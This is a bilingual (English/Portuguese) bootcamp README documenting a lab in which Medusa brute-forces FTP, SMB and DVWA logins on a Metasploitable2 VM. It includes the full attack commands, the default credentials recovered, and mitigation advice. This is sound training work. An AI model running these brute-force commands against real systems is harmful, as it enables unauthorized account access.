<!-- LANGUAGE / IDIOMA -->
<p align="right">
  <a href="#english">🇺🇸 English</a> &nbsp;|&nbsp;
  <a href="#portugues">🇧🇷 Português</a>
</p>

---

<h2 id="english">🇺🇸 English</h2>

# 🔐 Brute Force with Medusa — Parrot OS vs Metasploitable2

> **Bootcamp:** Riachuelo Cybersecurity — DIO
> **Challenge:** Brute Force Attacks with Medusa in a Controlled Environment
> **Tools:** Medusa, Nmap, smbclient, FTP client
> **Target:** Metasploitable2
> **Attacker:** Parrot OS

---

## ⚠️ Legal Disclaimer

This project is conducted **exclusively in an isolated lab environment**, with VMs configured for educational purposes. Executing attacks without authorization is a crime. **Never use these techniques outside authorized environments.**

---

## 🧠 Learning Objectives

- Understand brute force attacks against FTP, Web, and SMB services
- Use Medusa for security auditing in a controlled environment
- Document technical processes clearly and structurally
- Recognize common vulnerabilities and propose mitigation measures
- Use GitHub as a technical portfolio to share documentation and evidence

---

## 🖥️ Lab Environment

| Machine | OS | Role | IP |
|---|---|---|---|
| Parrot OS | Parrot 6.x | Attacker | 192.168.56.1 |
| Metasploitable2 | Ubuntu 8.04 LTS | Target | 192.168.56.101 |

> Network: VirtualBox **Host-Only (vboxnet0)** — 192.168.56.0/24

---

## 📁 Repository Structure

```
lab-smb-brute-force/
├── README.md
├── wordlists/
│   ├── usuarios.txt       # Users for FTP and SMB
│   ├── senhas.txt         # Passwords for FTP and SMB
│   ├── web_users.txt      # Users for DVWA
│   └── web_senhas.txt     # Passwords for DVWA
├── docs/
│   ├── conceitos.md       # Theory: brute force, techniques, mitigations
│   └── ambiente.md        # Lab environment setup
├── evidencias/
│   ├── relatorio_pentest_PT.docx   # Full technical report (Portuguese)
│   ├── relatorio_pentest_EN.docx   # Full technical report (English)
│   └── LEIA-ME.md                  # Evidence checklist
└── images/                # Organized screenshots
```

---

## 🔬 Lab 1 — FTP Brute Force (Port 21)

### Service Verification
```bash
nmap -p 21 192.168.56.101
# 21/tcp open  ftp
```

### Attack Execution
```bash
medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -v 6
```

### Result
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

### Access Validation
```bash
ftp 192.168.56.101
# login: msfadmin | password: msfadmin
```

---

## 🔬 Lab 2 — SMB Brute Force (Port 445)

### Service Verification
```bash
nmap -p 445 192.168.56.101
# 445/tcp open  microsoft-ds
```

### Attack Execution
```bash
medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M smbnt -v 6
```

### Result
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

### Access Validation
```bash
smbclient -L //192.168.56.101 -U msfadmin%msfadmin
```

| Sharename | Type | Notes |
|---|---|---|
| print$ | Disk | Printer Drivers |
| tmp | Disk | oh noes! — exposed temp dir |
| ADMIN$ | IPC | Full administrative access confirmed |
| msfadmin | Disk | Home Directory accessible |

---

## 🔬 Lab 3 — DVWA HTTP Brute Force (Port 80)

### DVWA Setup
1. Access `http://192.168.56.101/dvwa`
2. Initial login: `admin:password`
3. DVWA Security → set level to **Low**

### Attack Execution
```bash
medusa -h 192.168.56.101 -u admin -P wordlists/senhas.txt -M http \
  -m DIR:/dvwa/login.php -v 6
```

### Result
```
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: msfadmin [SUCCESS]
```

---

## 📊 Results Summary

| Lab | Protocol | Port | Credential Found | Time |
|---|---|---|---|---|
| Lab 1 | FTP | 21 | msfadmin:msfadmin | ~1 min |
| Lab 2 | SMB | 445 | msfadmin:msfadmin | < 1 sec |
| Lab 3 | HTTP/DVWA | 80 | admin:msfadmin | < 1 sec |

---

## 🛡️ Mitigation Recommendations

| Priority | Measure | Affected Services |
|---|---|---|
| 🔴 CRITICAL | Change all default passwords immediately | FTP, SMB, Web |
| 🔴 CRITICAL | Implement Account Lockout (block after 5 attempts) | All |
| 🟠 HIGH | Disable FTP — replace with SFTP/SCP | FTP |
| 🟠 HIGH | Disable SMBv1 — prevents EternalBlue (MS17-010) | SMB |
| 🟠 HIGH | Implement MFA on all administrative access | All |
| 🟡 MEDIUM | CAPTCHA + rate limiting on web forms | HTTP/Web |
| 🟡 MEDIUM | SIEM monitoring with brute force alerts | All |

---

## 📚 Key Concepts

| Technique | Description |
|---|---|
| **Brute Force** | Systematically tests all wordlist combinations |
| **Password Spraying** | Same password tested against multiple users |
| **Credential Stuffing** | Reuse of leaked credentials from other services |
| **Dictionary Attack** | Attack based on a wordlist of common passwords |

---

## 🛠️ Tools Used

| Tool | Usage |
|---|---|
| Medusa v2.3 | Brute force (FTP, SMB, HTTP) |
| Nmap 7.95 | Port discovery and scanning |
| smbclient | SMB access validation |
| DVWA v1.0.7 | Vulnerable web target |

---

<h2 id="portugues">🇧🇷 Português</h2>

# 🔐 Brute Force com Medusa — Parrot OS vs Metasploitable2

> **Bootcamp:** Riachuelo Cybersecurity — DIO
> **Desafio:** Ataques de Força Bruta com Medusa em Ambiente Controlado
> **Ferramentas:** Medusa, Nmap, smbclient, FTP client
> **Alvo:** Metasploitable2
> **Atacante:** Parrot OS

---

## ⚠️ Aviso Legal

Este projeto é realizado **exclusivamente em ambiente de laboratório isolado**, com VMs configuradas para fins educacionais. Executar ataques sem autorização é crime (Lei 12.737/2012 — Brasil). **Nunca utilize estas técnicas fora de ambientes autorizados.**

---

## 🧠 Objetivos de Aprendizagem

- Compreender ataques de força bruta em FTP, Web e SMB
- Utilizar o Medusa para auditoria de segurança em ambiente controlado
- Documentar processos técnicos de forma clara e estruturada
- Reconhecer vulnerabilidades comuns e propor medidas de mitigação
- Utilizar o GitHub como portfólio técnico

---

## 🖥️ Ambiente de Lab

| Máquina | Sistema | Papel | IP |
|---|---|---|---|
| Parrot OS | Parrot 6.x | Atacante | 192.168.56.1 |
| Metasploitable2 | Ubuntu 8.04 LTS | Alvo | 192.168.56.101 |

> Rede: VirtualBox **Host-Only (vboxnet0)** — 192.168.56.0/24

---

## 📁 Estrutura do Repositório

```
lab-smb-brute-force/
├── README.md
├── wordlists/
│   ├── usuarios.txt       # Usuários para FTP e SMB
│   ├── senhas.txt         # Senhas para FTP e SMB
│   ├── web_users.txt      # Usuários para DVWA
│   └── web_senhas.txt     # Senhas para DVWA
├── docs/
│   ├── conceitos.md       # Teoria: brute force, técnicas, mitigações
│   └── ambiente.md        # Configuração do ambiente de lab
├── evidencias/
│   ├── relatorio_pentest_PT.docx   # Relatório técnico completo (Português)
│   ├── relatorio_pentest_EN.docx   # Relatório técnico completo (Inglês)
│   └── LEIA-ME.md                  # Checklist de evidências
└── images/                # Screenshots organizados
```

---

## 🔬 Lab 1 — FTP Brute Force (Porta 21)

### Verificação do Serviço
```bash
nmap -p 21 192.168.56.101
# 21/tcp open  ftp
```

### Execução do Ataque
```bash
medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -v 6
```

### Resultado
```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

### Validação do Acesso
```bash
ftp 192.168.56.101
# login: msfadmin | senha: msfadmin
```

---

## 🔬 Lab 2 — SMB Brute Force (Porta 445)

### Verificação do Serviço
```bash
nmap -p 445 192.168.56.101
# 445/tcp open  microsoft-ds
```

### Execução do Ataque
```bash
medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M smbnt -v 6
```

### Resultado
```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

### Validação do Acesso
```bash
smbclient -L //192.168.56.101 -U msfadmin%msfadmin
```

| Sharename | Tipo | Observação |
|---|---|---|
| print$ | Disk | Printer Drivers |
| tmp | Disk | oh noes! — diretório temporário exposto |
| ADMIN$ | IPC | Acesso administrativo total confirmado |
| msfadmin | Disk | Home Directory acessível |

---

## 🔬 Lab 3 — DVWA HTTP Brute Force (Porta 80)

### Configuração do DVWA
1. Acessar `http://192.168.56.101/dvwa`
2. Login inicial: `admin:password`
3. DVWA Security → definir nível **Low**

### Execução do Ataque
```bash
medusa -h 192.168.56.101 -u admin -P wordlists/senhas.txt -M http \
  -m DIR:/dvwa/login.php -v 6
```

### Resultado
```
ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: msfadmin [SUCCESS]
```

---

## 📊 Resumo de Resultados

| Lab | Protocolo | Porta | Credencial Encontrada | Tempo |
|---|---|---|---|---|
| Lab 1 | FTP | 21 | msfadmin:msfadmin | ~1 min |
| Lab 2 | SMB | 445 | msfadmin:msfadmin | < 1 seg |
| Lab 3 | HTTP/DVWA | 80 | admin:msfadmin | < 1 seg |

---

## 🛡️ Recomendações de Mitigação

| Prioridade | Medida | Serviços Afetados |
|---|---|---|
| 🔴 CRÍTICO | Alterar todas as senhas padrão imediatamente | FTP, SMB, Web |
| 🔴 CRÍTICO | Implementar Account Lockout (bloqueio após 5 tentativas) | Todos |
| 🟠 ALTO | Desabilitar FTP — substituir por SFTP/SCP | FTP |
| 🟠 ALTO | Desabilitar SMBv1 — vulnerável a EternalBlue (MS17-010) | SMB |
| 🟠 ALTO | Implementar MFA em todos os acessos administrativos | Todos |
| 🟡 MÉDIO | CAPTCHA e rate limiting em formulários web | HTTP/Web |
| 🟡 MÉDIO | Monitoramento SIEM com alertas de brute force | Todos |

---

## 📚 Conceitos Abordados

| Técnica | Descrição |
|---|---|
| **Brute Force** | Testa sistematicamente todas as combinações da wordlist |
| **Password Spraying** | Mesma senha testada contra múltiplos usuários |
| **Credential Stuffing** | Reutilização de credenciais vazadas em outros serviços |
| **Dictionary Attack** | Ataque baseado em wordlist de senhas comuns |

---

## 🛠️ Ferramentas Utilizadas

| Ferramenta | Uso |
|---|---|
| Medusa v2.3 | Brute force (FTP, SMB, HTTP) |
| Nmap 7.95 | Descoberta e scan de portas |
| smbclient | Validação acesso SMB |
| DVWA v1.0.7 | Alvo web vulnerável |

---

## 👤 Autor / Author

**taissocout**
[![GitHub](https://img.shields.io/badge/GitHub-taissocout-black?logo=github)](https://github.com/taissocout)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-taissocout-blue?logo=linkedin)](https://linkedin.com/in/taissocout-cybersecurity)

> 🇧🇷 Desenvolvido como entrega do **Bootcamp Riachuelo Cybersecurity** na plataforma **DIO**.
> 🇺🇸 Developed as a **Riachuelo Cybersecurity Bootcamp** deliverable on the **DIO** platform.
